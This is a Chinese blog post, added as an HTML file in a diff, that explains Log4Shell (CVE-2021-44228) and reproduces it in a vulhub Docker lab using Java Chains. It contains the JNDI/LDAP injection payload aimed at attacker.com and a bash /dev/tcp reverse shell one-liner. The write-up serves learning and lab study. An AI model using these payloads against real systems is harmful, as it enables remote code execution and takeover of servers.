@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>漏洞分析之 CVE-2021-44228 | weyung's Blog</title>
+    <meta name="date" content="2025-04-11">
+    <link rel="canonical" href="https://weyung.cc/posts/91356ab7/">
+    <meta property="og:title" content="漏洞分析之 CVE-2021-44228 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="Log4j2 核弹级漏洞，时隔四年的复现。">
+    <meta property="og:description" content="Log4j2 核弹级漏洞，时隔四年的复现。">
+    <meta property="og:url" content="https://weyung.cc/posts/91356ab7/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">漏洞分析之 CVE-2021-44228</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>漏洞分析之 CVE-2021-44228</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>前言</h3>
+          <p>当时这个漏洞出来的时候各种公众号关于这个的稿子满天飞，但是一直是个守法好公民，也没想着拿去梭两把。</p>
+          <p>虽然现在对 Java 不怎么熟悉，但是还是想挑战下自己，觉得会挺有意思的。</p>
+          <h3>前置知识</h3>
+          <h4>Log4j2 的日志记录功能</h4>
+          <p>第一次看到 Log4j 可能会有点奇怪 —— 怎么叫这名</p>
+          <p>但是如果说这个是 Log for Java 的谐音的话，那一切就合理了</p>
+          <p>Log4j2 也不难理解，就是 Log4j 的第二个版本，就跟 python2 和 python3 一样，最早其实也是有 python 1.x 版本的，但是 python2 从 2000 年就开始推行，所以没人认识 python1.x 而已。</p>
+          <h4>Lookup 功能的设计缺陷</h4>
+          <p>Log4j2 支持一种名为 Lookup 的功能，允许在日志中插入动态内容，比如环境变量、系统信息等。</p>
+          <p>其语法为 <code class="language-text">$...</code>，例如 <code class="language-text">${java:version}</code> 会被替换为当前 Java 版本，听起来有点 SSTI 那味了。</p>
+          <h4>JNDI</h4>
+          <p>JNDI，全称 Java Naming and Directory Interface，Java 命名和目录接口，是 Java 提供的一种 API，用于访问命名和目录服务。</p>
+          <p>没接触过的读者看到这行字可能会心想：叽里咕噜说什么呢</p>
+          <p>但是问题不大，我也没看懂。</p>
+          <p>我们只需要大概理解成<strong>给他一个名字，他就能找到你想要的东西</strong>就行了，类似 Python 里的字典。</p>
+          <h4>LDAP</h4>
+          <p>LDAP，全称 Lightweight Directory Access Protocol，轻量级目录访问协议，是一种用于访问和维护分布式目录信息服务的协议。</p>
+          <p>如果这个也不看懂，那也没关系，同样类比 HTTP 协议就行了。</p>
+          <h3>原理</h3>
+          <p>假设有一个 Java 网站的登录接口记录用输入的用户名，大概意思是这样，代码不一定对：</p>
+          <pre><code class="language-java">logger.error("登录失败，用户名：" + username);</code></pre>
+          <p>若攻击者提交的用户名为 <code class="language-text">${jndi:ldap://attacker.com/Exploit}</code>，那么</p>
+          <ol>
+            <li>Log4j2 会解析 <code class="language-text">${jndi:...}</code>，向 <code class="language-text">attacker.com</code> 发起 LDAP 请求。</li>
+            <li>LDAP 服务器返回一个指向 <code class="language-text">http://attacker.com/Exploit.class</code> 的地址。</li>
+            <li>Java 应用下载并执行 <code class="language-text">Exploit.class</code> 中的恶意代码。</li>
+          </ol>
+          <h3>复现</h3>
+          <p>受影响的版本 Apache Log4j 2.x &lt;= 2.14.1 使用 <a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener noreferrer">vulhub</a> 的 docker 镜像，位于 <code class="language-text">/log4j/CVE-2021-44228</code></p>
+          <pre><code class="language-bash">docker-compose up -d</code></pre>
+          <p>启动一下（每日热知识：<code class="language-text">-d</code> 是 <code class="language-text">--detach</code> 的缩写，表示在后台运行容器）</p>
+          <p>试了好久那个 dnslog 都不行，感觉是网络问题，因为我本地访问也是时灵时不灵</p>
+          <p>不管那么多了，直接上 exploit 但是试了好久也不太行，看日志发现貌似是网络问题，于是把靶机和 Java Chains 塞一块，docker-compose 配置如下：</p>
+          <pre><code class="language-yaml">version: '2'
+services:
+  solr:
+    image: vulhub/solr:8.11.0
+    ports:
+      - "8983:8983"
+      - "5005:5005"
+  java-chains:
+    image: javachains/javachains:latest
+    ports:
+      - "8011:8011"
+      - "58080:58080"
+      - "50389:50389"
+      - "50388:50388"
+      - "3308:3308"
+      - "13999:13999"
+      - "50000:50000"
+      - "11527:11527"
+    environment:
+      - CHAINS_AUTH=true
+      - CHAINS_PASS=
+    restart: always</code></pre>
+          <p>依着 vulhub 自带的<a href="https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md" target="_blank" rel="noopener noreferrer">教程</a>做，但是有个比较关键的点，那就是<strong>在 JDNI Control 面板把 IP 调成 Java Chains 的 IP</strong>，因为受害机要通过这个 IP 反连过来下载恶意代码（上文已经提过），此事在<a href="https://java-chains.vulhub.org/zh/docs/module/jndi#jndibasicpayload" target="_blank" rel="noopener noreferrer">Java Chains 文档</a>中亦有记载。</p>
+          <p>经测试 <code class="language-text">touch /tmp/success</code> 成功，具体的反弹 shell 就不作测试了，贴个简单的反弹 shell 命令：</p>
+          <pre><code class="language-bash">bash -i >&amp; /dev/tcp/attacker_ip/port 0>&amp;1</code></pre>
+          <h3>参考</h3>
+          <p><a href="https://blog.csdn.net/qq_41132792/article/details/124952616" target="_blank" rel="noopener noreferrer">log4j2漏洞CVE-2021-44228复现笔记(纯步骤过程，没有复杂的知识点)</a> <a href="https://baijiahao.baidu.com/s?id=1718842142014280135" target="_blank" rel="noopener noreferrer">跟个风，聊一聊这两天很火的Log4j核弹级漏洞</a></p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/渗透/" style="--tag-background:var(--tag-background-teal);--tag-color:var(--tag-color-teal);--tag-background-hover:var(--tag-hover-teal);--tag-border:var(--tag-border-teal);--tag-border-hover:var(--tag-border-teal);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-sword.svg&quot;);"></span><span class="tag-content"><span>渗透</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2025 年 4 月 11 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/cve/">CVE</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/91356ab7/">https://weyung.cc/posts/91356ab7/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/8a6f9a7b/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">Java 基础概念</p></a><a class="post-neighbor" href="/posts/21849513/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">漏洞分析之 CVE-2016-5195</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
